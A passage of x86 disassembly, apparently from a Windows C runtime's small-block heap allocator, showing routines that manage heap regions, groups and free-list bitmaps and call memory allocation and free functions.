  426a07:	mov    eax,ds:0x45defc
  426a0c:	mov    edx,DWORD PTR ds:0x45df00
  426a12:	lea    eax,[eax+eax*4]
  426a15:	shl    eax,0x2
  426a18:	mov    ecx,eax
  426a1a:	mov    eax,ds:0x45def8
  426a1f:	sub    ecx,eax
  426a21:	lea    ecx,[ecx+edx*1-0x14]
  426a25:	push   ecx
  426a26:	lea    ecx,[eax+0x14]
  426a29:	push   ecx
  426a2a:	push   eax
  426a2b:	call   0x428280
  426a30:	mov    eax,DWORD PTR [ebp+0x8]
  426a33:	add    esp,0xc
  426a36:	dec    DWORD PTR ds:0x45defc
  426a3c:	cmp    eax,DWORD PTR ds:0x45def8
  426a42:	jbe    0x426a48
  426a44:	sub    DWORD PTR [ebp+0x8],0x14
  426a48:	mov    eax,ds:0x45df00
  426a4d:	mov    ds:0x45df08,eax
  426a52:	mov    eax,DWORD PTR [ebp+0x8]
  426a55:	mov    ds:0x45def8,eax
  426a5a:	mov    DWORD PTR ds:0x45df10,edi
  426a60:	pop    ebx
  426a61:	pop    edi
  426a62:	pop    esi
  426a63:	leave  
  426a64:	ret    
  426a65:	mov    eax,ds:0x45defc
  426a6a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a70:	push   edi
  426a71:	xor    edi,edi
  426a73:	cmp    eax,ecx
  426a75:	jne    0x426aab
  426a77:	lea    eax,[ecx+ecx*4+0x50]
  426a7b:	shl    eax,0x2
  426a7e:	push   eax
  426a7f:	push   DWORD PTR ds:0x45df00
  426a85:	push   edi
  426a86:	push   DWORD PTR ds:0x45e140
  426a8c:	call   DWORD PTR ds:0x4290d0
  426a92:	cmp    eax,edi
  426a94:	jne    0x426a9a
  426a96:	xor    eax,eax
  426a98:	pop    edi
  426a99:	ret    
  426a9a:	add    DWORD PTR ds:0x45df0c,0x10
  426aa1:	mov    ds:0x45df00,eax
  426aa6:	mov    eax,ds:0x45defc
  426aab:	mov    ecx,DWORD PTR ds:0x45df00
  426ab1:	push   esi
  426ab2:	push   0x41c4
  426ab7:	push   0x8
  426ab9:	push   DWORD PTR ds:0x45e140
  426abf:	lea    eax,[eax+eax*4]
  426ac2:	lea    esi,[ecx+eax*4]
  426ac5:	call   DWORD PTR ds:0x429030
  426acb:	cmp    eax,edi
  426acd:	mov    DWORD PTR [esi+0x10],eax
  426ad0:	jne    0x426ad6
  426ad2:	xor    eax,eax
  426ad4:	jmp    0x426b19
  426ad6:	push   0x4
  426ad8:	push   0x2000
  426add:	push   0x100000
  426ae2:	push   edi
  426ae3:	call   DWORD PTR ds:0x4290cc
  426ae9:	cmp    eax,edi
  426aeb:	mov    DWORD PTR [esi+0xc],eax
  426aee:	jne    0x426b02
  426af0:	push   DWORD PTR [esi+0x10]
  426af3:	push   edi
  426af4:	push   DWORD PTR ds:0x45e140
  426afa:	call   DWORD PTR ds:0x42902c
  426b00:	jmp    0x426ad2
  426b02:	or     DWORD PTR [esi+0x8],0xffffffff
  426b06:	mov    DWORD PTR [esi],edi
  426b08:	mov    DWORD PTR [esi+0x4],edi
  426b0b:	inc    DWORD PTR ds:0x45defc
  426b11:	mov    eax,DWORD PTR [esi+0x10]
  426b14:	or     DWORD PTR [eax],0xffffffff
  426b17:	mov    eax,esi
  426b19:	pop    esi
  426b1a:	pop    edi
  426b1b:	ret    
  426b1c:	push   ebp
  426b1d:	mov    ebp,esp
  426b1f:	push   ecx
  426b20:	push   ecx
  426b21:	mov    ecx,DWORD PTR [ebp+0x8]
  426b24:	mov    eax,DWORD PTR [ecx+0x8]
  426b27:	push   ebx
  426b28:	push   esi
  426b29:	mov    esi,DWORD PTR [ecx+0x10]
  426b2c:	push   edi
  426b2d:	xor    ebx,ebx
  426b2f:	jmp    0x426b34
  426b31:	shl    eax,1
  426b33:	inc    ebx
  426b34:	test   eax,eax
  426b36:	jge    0x426b31
  426b38:	mov    eax,ebx
  426b3a:	imul   eax,eax,0x204
  426b40:	lea    eax,[eax+esi*1+0x144]
  426b47:	push   0x3f
  426b49:	mov    DWORD PTR [ebp-0x8],eax
  426b4c:	pop    edx
  426b4d:	mov    DWORD PTR [eax+0x8],eax
  426b50:	mov    DWORD PTR [eax+0x4],eax
  426b53:	add    eax,0x8
  426b56:	dec    edx
  426b57:	jne    0x426b4d
  426b59:	push   0x4
  426b5b:	mov    edi,ebx
  426b5d:	push   0x1000
  426b62:	shl    edi,0xf
  426b65:	add    edi,DWORD PTR [ecx+0xc]
  426b68:	push   0x8000
  426b6d:	push   edi
  426b6e:	call   DWORD PTR ds:0x4290cc
  426b74:	test   eax,eax
  426b76:	jne    0x426b80
  426b78:	or     eax,0xffffffff
  426b7b:	jmp    0x426c1d
  426b80:	lea    edx,[edi+0x7000]
  426b86:	cmp    edi,edx
  426b88:	mov    DWORD PTR [ebp-0x4],edx
  426b8b:	ja     0x426bd0
  426b8d:	mov    ecx,edx
  426b8f:	sub    ecx,edi
  426b91:	shr    ecx,0xc
  426b94:	lea    eax,[edi+0x10]
  426b97:	inc    ecx
  426b98:	or     DWORD PTR [eax-0x8],0xffffffff
  426b9c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426ba3:	lea    edx,[eax+0xffc]
  426ba9:	mov    DWORD PTR [eax],edx
  426bab:	lea    edx,[eax-0x1004]
  426bb1:	mov    DWORD PTR [eax-0x4],0xff0
  426bb8:	mov    DWORD PTR [eax+0x4],edx
  426bbb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bc5:	add    eax,0x1000
  426bca:	dec    ecx
  426bcb:	jne    0x426b98
  426bcd:	mov    edx,DWORD PTR [ebp-0x4]
  426bd0:	mov    eax,DWORD PTR [ebp-0x8]
  426bd3:	add    eax,0x1f8
  426bd8:	lea    ecx,[edi+0xc]
  426bdb:	mov    DWORD PTR [eax+0x4],ecx
  426bde:	mov    DWORD PTR [ecx+0x8],eax
  426be1:	lea    ecx,[edx+0xc]
  426be4:	mov    DWORD PTR [eax+0x8],ecx
  426be7:	mov    DWORD PTR [ecx+0x4],eax
  426bea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bef:	xor    edi,edi
  426bf1:	inc    edi
  426bf2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426bf9:	mov    al,BYTE PTR [esi+0x43]
  426bfc:	mov    cl,al
  426bfe:	inc    cl
  426c00:	test   al,al
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	mov    BYTE PTR [esi+0x43],cl
  426c08:	jne    0x426c0d
  426c0a:	or     DWORD PTR [eax+0x4],edi
  426c0d:	mov    edx,0x80000000
  426c12:	mov    ecx,ebx
  426c14:	shr    edx,cl
  426c16:	not    edx
  426c18:	and    DWORD PTR [eax+0x8],edx
  426c1b:	mov    eax,ebx
  426c1d:	pop    edi
  426c1e:	pop    esi
  426c1f:	pop    ebx
  426c20:	leave  
  426c21:	ret    
  426c22:	push   ebp
  426c23:	mov    ebp,esp
  426c25:	sub    esp,0xc
  426c28:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2b:	mov    eax,DWORD PTR [ecx+0x10]
  426c2e:	push   ebx
  426c2f:	push   esi
  426c30:	mov    esi,DWORD PTR [ebp+0x10]
  426c33:	push   edi
  426c34:	mov    edi,DWORD PTR [ebp+0xc]
  426c37:	mov    edx,edi
  426c39:	sub    edx,DWORD PTR [ecx+0xc]
  426c3c:	add    esi,0x17
  426c3f:	shr    edx,0xf
  426c42:	mov    ecx,edx
  426c44:	imul   ecx,ecx,0x204
  426c4a:	lea    ecx,[ecx+eax*1+0x144]
  426c51:	mov    DWORD PTR [ebp-0xc],ecx
  426c54:	mov    ecx,DWORD PTR [edi-0x4]
  426c57:	and    esi,0xfffffff0
  426c5a:	dec    ecx
  426c5b:	cmp    esi,ecx
  426c5d:	lea    edi,[ecx+edi*1-0x4]
  426c61:	mov    ebx,DWORD PTR [edi]
  426c63:	mov    DWORD PTR [ebp+0x10],ecx
  426c66:	mov    DWORD PTR [ebp-0x4],ebx
  426c69:	jle    0x426dc4
  426c6f:	test   bl,0x1
  426c72:	jne    0x426dbd
  426c78:	add    ebx,ecx
  426c7a:	cmp    esi,ebx
  426c7c:	jg     0x426dbd
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	sar    ecx,0x4
  426c88:	dec    ecx
  426c89:	cmp    ecx,0x3f
  426c8c:	mov    DWORD PTR [ebp-0x8],ecx
  426c8f:	jbe    0x426c97
  426c91:	push   0x3f
  426c93:	pop    ecx
  426c94:	mov    DWORD PTR [ebp-0x8],ecx
  426c97:	mov    ebx,DWORD PTR [edi+0x4]
  426c9a:	cmp    ebx,DWORD PTR [edi+0x8]
  426c9d:	jne    0x426ce2
  426c9f:	cmp    ecx,0x20
  426ca2:	mov    ebx,0x80000000
  426ca7:	jae    0x426cc3
  426ca9:	shr    ebx,cl
  426cab:	mov    ecx,DWORD PTR [ebp-0x8]
  426cae:	lea    ecx,[ecx+eax*1+0x4]
  426cb2:	not    ebx
  426cb4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cb8:	dec    BYTE PTR [ecx]
  426cba:	jne    0x426ce2
  426cbc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cbf:	and    DWORD PTR [ecx],ebx
  426cc1:	jmp    0x426ce2
  426cc3:	add    ecx,0xffffffe0
  426cc6:	shr    ebx,cl
  426cc8:	mov    ecx,DWORD PTR [ebp-0x8]
  426ccb:	lea    ecx,[ecx+eax*1+0x4]
  426ccf:	not    ebx
  426cd1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426cd8:	dec    BYTE PTR [ecx]
  426cda:	jne    0x426ce2
  426cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cdf:	and    DWORD PTR [ecx+0x4],ebx
  426ce2:	mov    ecx,DWORD PTR [edi+0x8]
  426ce5:	mov    ebx,DWORD PTR [edi+0x4]
  426ce8:	mov    DWORD PTR [ecx+0x4],ebx
  426ceb:	mov    ecx,DWORD PTR [edi+0x4]
  426cee:	mov    edi,DWORD PTR [edi+0x8]
  426cf1:	mov    DWORD PTR [ecx+0x8],edi
  426cf4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cf7:	sub    ecx,esi
  426cf9:	add    DWORD PTR [ebp-0x4],ecx
  426cfc:	cmp    DWORD PTR [ebp-0x4],0x0
  426d00:	jle    0x426dab
  426d06:	mov    edi,DWORD PTR [ebp-0x4]
  426d09:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0c:	sar    edi,0x4
  426d0f:	dec    edi
  426d10:	cmp    edi,0x3f
  426d13:	lea    ecx,[ecx+esi*1-0x4]
  426d17:	jbe    0x426d1c
  426d19:	push   0x3f
  426d1b:	pop    edi
  426d1c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d1f:	lea    ebx,[ebx+edi*8]
  426d22:	mov    DWORD PTR [ebp+0x10],ebx
  426d25:	mov    ebx,DWORD PTR [ebx+0x4]
  426d28:	mov    DWORD PTR [ecx+0x4],ebx
  426d2b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2e:	mov    DWORD PTR [ecx+0x8],ebx
  426d31:	mov    DWORD PTR [ebx+0x4],ecx
  426d34:	mov    ebx,DWORD PTR [ecx+0x4]
  426d37:	mov    DWORD PTR [ebx+0x8],ecx
  426d3a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d3d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d40:	jne    0x426d99
  426d42:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d46:	mov    BYTE PTR [ebp+0x13],cl
  426d49:	inc    cl
  426d4b:	cmp    edi,0x20
  426d4e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d52:	jae    0x426d70
  426d54:	cmp    BYTE PTR [ebp+0x13],0x0
  426d58:	jne    0x426d68
  426d5a:	mov    ecx,edi
  426d5c:	mov    ebx,0x80000000
  426d61:	shr    ebx,cl
  426d63:	mov    ecx,DWORD PTR [ebp+0x8]
  426d66:	or     DWORD PTR [ecx],ebx
  426d68:	lea    eax,[eax+edx*4+0x44]
  426d6c:	mov    ecx,edi
  426d6e:	jmp    0x426d90
  426d70:	cmp    BYTE PTR [ebp+0x13],0x0
  426d74:	jne    0x426d86
  426d76:	lea    ecx,[edi-0x20]
  426d79:	mov    ebx,0x80000000
  426d7e:	shr    ebx,cl
  426d80:	mov    ecx,DWORD PTR [ebp+0x8]
  426d83:	or     DWORD PTR [ecx+0x4],ebx
  426d86:	lea    eax,[eax+edx*4+0xc4]
  426d8d:	lea    ecx,[edi-0x20]
  426d90:	mov    edx,0x80000000
  426d95:	shr    edx,cl
  426d97:	or     DWORD PTR [eax],edx
  426d99:	mov    edx,DWORD PTR [ebp+0xc]
  426d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  426d9f:	lea    eax,[edx+esi*1-0x4]
  426da3:	mov    DWORD PTR [eax],ecx
  426da5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426da9:	jmp    0x426dae
  426dab:	mov    edx,DWORD PTR [ebp+0xc]
  426dae:	lea    eax,[esi+0x1]
  426db1:	mov    DWORD PTR [edx-0x4],eax
  426db4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426db8:	jmp    0x426ef9
  426dbd:	xor    eax,eax
  426dbf:	jmp    0x426efc
  426dc4:	jge    0x426ef9
  426dca:	mov    ebx,DWORD PTR [ebp+0xc]
  426dcd:	sub    DWORD PTR [ebp+0x10],esi
  426dd0:	lea    ecx,[esi+0x1]
  426dd3:	mov    DWORD PTR [ebx-0x4],ecx
  426dd6:	lea    ebx,[ebx+esi*1-0x4]
  426dda:	mov    esi,DWORD PTR [ebp+0x10]
  426ddd:	sar    esi,0x4
  426de0:	dec    esi
  426de1:	cmp    esi,0x3f
  426de4:	mov    DWORD PTR [ebp+0xc],ebx
  426de7:	mov    DWORD PTR [ebx-0x4],ecx
  426dea:	jbe    0x426def
  426dec:	push   0x3f
  426dee:	pop    esi
  426def:	test   BYTE PTR [ebp-0x4],0x1
  426df3:	jne    0x426e79
  426df9:	mov    esi,DWORD PTR [ebp-0x4]
  426dfc:	sar    esi,0x4
  426dff:	dec    esi
  426e00:	cmp    esi,0x3f
  426e03:	jbe    0x426e08
  426e05:	push   0x3f
  426e07:	pop    esi
  426e08:	mov    ecx,DWORD PTR [edi+0x4]
  426e0b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e0e:	jne    0x426e52
  426e10:	cmp    esi,0x20
  426e13:	mov    ebx,0x80000000
  426e18:	jae    0x426e33
  426e1a:	mov    ecx,esi
  426e1c:	shr    ebx,cl
  426e1e:	lea    esi,[esi+eax*1+0x4]
  426e22:	not    ebx
  426e24:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e28:	dec    BYTE PTR [esi]
  426e2a:	jne    0x426e4f
  426e2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2f:	and    DWORD PTR [ecx],ebx
  426e31:	jmp    0x426e4f
  426e33:	lea    ecx,[esi-0x20]
  426e36:	shr    ebx,cl
  426e38:	lea    ecx,[esi+eax*1+0x4]
  426e3c:	not    ebx
  426e3e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e45:	dec    BYTE PTR [ecx]
  426e47:	jne    0x426e4f
  426e49:	mov    ecx,DWORD PTR [ebp+0x8]
  426e4c:	and    DWORD PTR [ecx+0x4],ebx
  426e4f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e52:	mov    ecx,DWORD PTR [edi+0x8]
  426e55:	mov    esi,DWORD PTR [edi+0x4]
  426e58:	mov    DWORD PTR [ecx+0x4],esi
  426e5b:	mov    esi,DWORD PTR [edi+0x8]
  426e5e:	mov    ecx,DWORD PTR [edi+0x4]
  426e61:	mov    DWORD PTR [ecx+0x8],esi
  426e64:	mov    esi,DWORD PTR [ebp+0x10]
  426e67:	add    esi,DWORD PTR [ebp-0x4]
  426e6a:	mov    DWORD PTR [ebp+0x10],esi
  426e6d:	sar    esi,0x4
  426e70:	dec    esi
  426e71:	cmp    esi,0x3f
  426e74:	jbe    0x426e79
  426e76:	push   0x3f
  426e78:	pop    esi
  426e79:	mov    ecx,DWORD PTR [ebp-0xc]
  426e7c:	lea    ecx,[ecx+esi*8]
  426e7f:	mov    edi,DWORD PTR [ecx+0x4]
  426e82:	mov    DWORD PTR [ebx+0x8],ecx
  426e85:	mov    DWORD PTR [ebx+0x4],edi
  426e88:	mov    DWORD PTR [ecx+0x4],ebx
  426e8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e8e:	mov    DWORD PTR [ecx+0x8],ebx
  426e91:	mov    ecx,DWORD PTR [ebx+0x4]
  426e94:	cmp    ecx,DWORD PTR [ebx+0x8]
  426e97:	jne    0x426ef0
  426e99:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426e9d:	mov    BYTE PTR [ebp+0xf],cl
  426ea0:	inc    cl
  426ea2:	cmp    esi,0x20
  426ea5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426ea9:	jae    0x426ec7
  426eab:	cmp    BYTE PTR [ebp+0xf],0x0
  426eaf:	jne    0x426ebf
  426eb1:	mov    ecx,esi
  426eb3:	mov    edi,0x80000000
  426eb8:	shr    edi,cl
  426eba:	mov    ecx,DWORD PTR [ebp+0x8]
  426ebd:	or     DWORD PTR [ecx],edi
  426ebf:	lea    eax,[eax+edx*4+0x44]
  426ec3:	mov    ecx,esi
  426ec5:	jmp    0x426ee7
  426ec7:	cmp    BYTE PTR [ebp+0xf],0x0
  426ecb:	jne    0x426edd
  426ecd:	lea    ecx,[esi-0x20]
  426ed0:	mov    edi,0x80000000
  426ed5:	shr    edi,cl
  426ed7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eda:	or     DWORD PTR [ecx+0x4],edi
  426edd:	lea    eax,[eax+edx*4+0xc4]
  426ee4:	lea    ecx,[esi-0x20]
  426ee7:	mov    edx,0x80000000
  426eec:	shr    edx,cl
  426eee:	or     DWORD PTR [eax],edx
  426ef0:	mov    eax,DWORD PTR [ebp+0x10]
  426ef3:	mov    DWORD PTR [ebx],eax
  426ef5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426ef9:	xor    eax,eax
  426efb:	inc    eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    
  426f01:	push   ebp
  426f02:	mov    ebp,esp
  426f04:	sub    esp,0x14
  426f07:	mov    ecx,DWORD PTR [ebp+0x8]
  426f0a:	mov    eax,ds:0x45defc
  426f0f:	mov    edx,DWORD PTR ds:0x45df00
  426f15:	add    ecx,0x17
  426f18:	and    ecx,0xfffffff0
  426f1b:	push   ebx
  426f1c:	mov    DWORD PTR [ebp-0x10],ecx
  426f1f:	sar    ecx,0x4
  426f22:	push   esi
  426f23:	lea    eax,[eax+eax*4]
  426f26:	push   edi
  426f27:	dec    ecx
  426f28:	cmp    ecx,0x20
  426f2b:	lea    edi,[edx+eax*4]
  426f2e:	mov    DWORD PTR [ebp-0x4],edi
  426f31:	jge    0x426f3e
  426f33:	or     esi,0xffffffff
  426f36:	shr    esi,cl
  426f38:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f3c:	jmp    0x426f4b
  426f3e:	add    ecx,0xffffffe0
  426f41:	or     eax,0xffffffff
  426f44:	xor    esi,esi
  426f46:	shr    eax,cl
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,ds:0x45df08
  426f50:	mov    ebx,eax
  426f52:	mov    DWORD PTR [ebp-0xc],esi
  426f55:	cmp    ebx,edi
  426f57:	jmp    0x426f6d
  426f59:	mov    ecx,DWORD PTR [ebx+0x4]
  426f5c:	mov    edi,DWORD PTR [ebx]
  426f5e:	and    ecx,DWORD PTR [ebp-0x8]
  426f61:	and    edi,esi
  426f63:	or     ecx,edi
  426f65:	jne    0x426f72
  426f67:	add    ebx,0x14
  426f6a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f6d:	mov    DWORD PTR [ebp+0x8],ebx
  426f70:	jb     0x426f59
  426f72:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f75:	jne    0x426f9b
  426f77:	mov    ebx,edx
  426f79:	jmp    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    edi,DWORD PTR [ebx]
  426f80:	and    ecx,DWORD PTR [ebp-0x8]
  426f83:	and    edi,esi
  426f85:	or     ecx,edi
  426f87:	jne    0x426f93
  426f89:	add    ebx,0x14
  426f8c:	cmp    ebx,eax
  426f8e:	mov    DWORD PTR [ebp+0x8],ebx
  426f91:	jb     0x426f7b
  426f93:	cmp    ebx,eax
  426f95:	je     0x42702f
  426f9b:	mov    DWORD PTR ds:0x45df08,ebx
  426fa1:	mov    eax,DWORD PTR [ebx+0x10]
  426fa4:	mov    edx,DWORD PTR [eax]
  426fa6:	cmp    edx,0xffffffff
  426fa9:	mov    DWORD PTR [ebp-0x4],edx
  426fac:	je     0x426fc2
  426fae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fb5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fb9:	and    ecx,DWORD PTR [ebp-0x8]
  426fbc:	and    edi,esi
  426fbe:	or     ecx,edi
  426fc0:	jne    0x426ff8
  426fc2:	mov    edx,DWORD PTR [eax+0xc4]
  426fc8:	and    edx,DWORD PTR [ebp-0x8]
  426fcb:	and    DWORD PTR [ebp-0x4],0x0
  426fcf:	lea    ecx,[eax+0x44]
  426fd2:	mov    esi,DWORD PTR [ecx]
  426fd4:	and    esi,DWORD PTR [ebp-0xc]
  426fd7:	or     edx,esi
  426fd9:	mov    esi,DWORD PTR [ebp-0xc]
  426fdc:	jne    0x426ff5
  426fde:	mov    edx,DWORD PTR [ecx+0x84]
  426fe4:	and    edx,DWORD PTR [ebp-0x8]
  426fe7:	inc    DWORD PTR [ebp-0x4]
  426fea:	add    ecx,0x4
  426fed:	mov    edi,DWORD PTR [ecx]
  426fef:	and    edi,esi
  426ff1:	or     edx,edi
  426ff3:	je     0x426fde
  426ff5:	mov    edx,DWORD PTR [ebp-0x4]
  426ff8:	mov    ecx,edx
  426ffa:	imul   ecx,ecx,0x204
  427000:	lea    ecx,[ecx+eax*1+0x144]
  427007:	mov    DWORD PTR [ebp-0xc],ecx
  42700a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42700e:	xor    edi,edi
  427010:	and    ecx,esi
  427012:	jne    0x427081
  427014:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42701b:	and    ecx,DWORD PTR [ebp-0x8]
  42701e:	push   0x20
  427020:	pop    edi
  427021:	jmp    0x427081
  427023:	cmp    DWORD PTR [ebx+0x8],0x0
  427027:	jne    0x427034
  427029:	add    ebx,0x14
  42702c:	mov    DWORD PTR [ebp+0x8],ebx
  42702f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427032:	jb     0x427023
  427034:	cmp    ebx,DWORD PTR [ebp-0x4]
  427037:	jne    0x42705f
  427039:	mov    ebx,edx
  42703b:	jmp    0x427046
  42703d:	cmp    DWORD PTR [ebx+0x8],0x0
  427041:	jne    0x42704d
  427043:	add    ebx,0x14
  427046:	cmp    ebx,eax
  427048:	mov    DWORD PTR [ebp+0x8],ebx
  42704b:	jb     0x42703d
  42704d:	cmp    ebx,eax
  42704f:	jne    0x42705f
  427051:	call   0x426a65
  427056:	mov    ebx,eax
  427058:	test   ebx,ebx
  42705a:	mov    DWORD PTR [ebp+0x8],ebx
  42705d:	je     0x427077
  42705f:	push   ebx
  427060:	call   0x426b1c
  427065:	pop    ecx
  427066:	mov    ecx,DWORD PTR [ebx+0x10]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x10]
  42706e:	cmp    DWORD PTR [eax],0xffffffff
  427071:	jne    0x426f9b
  427077:	xor    eax,eax
  427079:	jmp    0x4271f8
  42707e:	shl    ecx,1
  427080:	inc    edi
  427081:	test   ecx,ecx
  427083:	jge    0x42707e
  427085:	mov    ecx,DWORD PTR [ebp-0xc]
  427088:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42708c:	mov    ecx,DWORD PTR [edx]
  42708e:	sub    ecx,DWORD PTR [ebp-0x10]
  427091:	mov    esi,ecx
  427093:	sar    esi,0x4
  427096:	dec    esi
  427097:	cmp    esi,0x3f
  42709a:	mov    DWORD PTR [ebp-0x8],ecx
  42709d:	jle    0x4270a2
  42709f:	push   0x3f
  4270a1:	pop    esi
  4270a2:	cmp    esi,edi
  4270a4:	je     0x4271ab
  4270aa:	mov    ecx,DWORD PTR [edx+0x4]
  4270ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4270b0:	jne    0x42710e
  4270b2:	cmp    edi,0x20
  4270b5:	mov    ebx,0x80000000
  4270ba:	jge    0x4270e2
  4270bc:	mov    ecx,edi
  4270be:	shr    ebx,cl
  4270c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c3:	lea    edi,[eax+edi*1+0x4]
  4270c7:	not    ebx
  4270c9:	mov    DWORD PTR [ebp-0x14],ebx
  4270cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270d4:	dec    BYTE PTR [edi]
  4270d6:	jne    0x42710b
  4270d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270db:	mov    ebx,DWORD PTR [ebp+0x8]
  4270de:	and    DWORD PTR [ebx],ecx
  4270e0:	jmp    0x42710e
  4270e2:	lea    ecx,[edi-0x20]
  4270e5:	shr    ebx,cl
  4270e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270ea:	lea    ecx,[eax+ecx*4+0xc4]
  4270f1:	lea    edi,[eax+edi*1+0x4]
  4270f5:	not    ebx
  4270f7:	and    DWORD PTR [ecx],ebx
  4270f9:	dec    BYTE PTR [edi]
  4270fb:	mov    DWORD PTR [ebp-0x14],ebx
  4270fe:	jne    0x42710b
  427100:	mov    ebx,DWORD PTR [ebp+0x8]
  427103:	mov    ecx,DWORD PTR [ebp-0x14]
  427106:	and    DWORD PTR [ebx+0x4],ecx
  427109:	jmp    0x42710e
  42710b:	mov    ebx,DWORD PTR [ebp+0x8]
  42710e:	cmp    DWORD PTR [ebp-0x8],0x0
  427112:	mov    ecx,DWORD PTR [edx+0x8]
  427115:	mov    edi,DWORD PTR [edx+0x4]
  427118:	mov    DWORD PTR [ecx+0x4],edi
  42711b:	mov    ecx,DWORD PTR [edx+0x4]
  42711e:	mov    edi,DWORD PTR [edx+0x8]
  427121:	mov    DWORD PTR [ecx+0x8],edi
  427124:	je     0x4271b7
  42712a:	mov    ecx,DWORD PTR [ebp-0xc]
  42712d:	lea    ecx,[ecx+esi*8]
  427130:	mov    edi,DWORD PTR [ecx+0x4]
  427133:	mov    DWORD PTR [edx+0x8],ecx
  427136:	mov    DWORD PTR [edx+0x4],edi
  427139:	mov    DWORD PTR [ecx+0x4],edx
  42713c:	mov    ecx,DWORD PTR [edx+0x4]
  42713f:	mov    DWORD PTR [ecx+0x8],edx
  427142:	mov    ecx,DWORD PTR [edx+0x4]
  427145:	cmp    ecx,DWORD PTR [edx+0x8]
  427148:	jne    0x4271a8
  42714a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42714e:	mov    BYTE PTR [ebp+0xb],cl
  427151:	inc    cl
  427153:	cmp    esi,0x20
  427156:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42715a:	jge    0x42717f
  42715c:	cmp    BYTE PTR [ebp+0xb],0x0
  427160:	jne    0x42716d
  427162:	mov    edi,0x80000000
  427167:	mov    ecx,esi
  427169:	shr    edi,cl
  42716b:	or     DWORD PTR [ebx],edi
  42716d:	mov    ecx,esi
  42716f:	mov    edi,0x80000000
  427174:	shr    edi,cl
  427176:	mov    ecx,DWORD PTR [ebp-0x4]
  427179:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42717d:	jmp    0x4271a8
  42717f:	cmp    BYTE PTR [ebp+0xb],0x0
  427183:	jne    0x427192
  427185:	lea    ecx,[esi-0x20]
  427188:	mov    edi,0x80000000
  42718d:	shr    edi,cl
  42718f:	or     DWORD PTR [ebx+0x4],edi
  427192:	mov    ecx,DWORD PTR [ebp-0x4]
  427195:	lea    edi,[eax+ecx*4+0xc4]
  42719c:	lea    ecx,[esi-0x20]
  42719f:	mov    esi,0x80000000
  4271a4:	shr    esi,cl
  4271a6:	or     DWORD PTR [edi],esi
  4271a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ab:	test   ecx,ecx
  4271ad:	je     0x4271ba
  4271af:	mov    DWORD PTR [edx],ecx
  4271b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271b5:	jmp    0x4271ba
  4271b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ba:	mov    esi,DWORD PTR [ebp-0x10]
  4271bd:	add    edx,ecx
  4271bf:	lea    ecx,[esi+0x1]
  4271c2:	mov    DWORD PTR [edx],ecx
  4271c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271c8:	mov    esi,DWORD PTR [ebp-0xc]
  4271cb:	mov    ecx,DWORD PTR [esi]
  4271cd:	test   ecx,ecx
  4271cf:	lea    edi,[ecx+0x1]
  4271d2:	mov    DWORD PTR [esi],edi
  4271d4:	jne    0x4271f0
  4271d6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271dc:	jne    0x4271f0
  4271de:	mov    ecx,DWORD PTR [ebp-0x4]
  4271e1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271e7:	jne    0x4271f0
  4271e9:	and    DWORD PTR ds:0x45def8,0x0
  4271f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f3:	mov    DWORD PTR [eax],ecx
